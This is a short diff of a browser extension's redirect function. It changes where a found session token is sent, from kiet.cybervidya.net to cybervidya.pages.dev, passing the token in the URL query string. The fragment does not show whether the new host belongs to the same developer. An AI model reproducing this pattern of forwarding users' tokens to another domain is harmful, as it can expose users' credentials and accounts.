@@ -15,7 +15,7 @@ function checkAndRedirect() {
 				token = token.replace(/^"|"$/g, "");
 
 				console.log("Kiet Extension: Token found, redirecting...");
-				window.location.href = `https://kiet.cybervidya.net/?token=${encodeURIComponent(token)}`;
+				window.location.href = `https://cybervidya.pages.dev/?token=${encodeURIComponent(token)}`;
 			}
 		}
 	} else if (
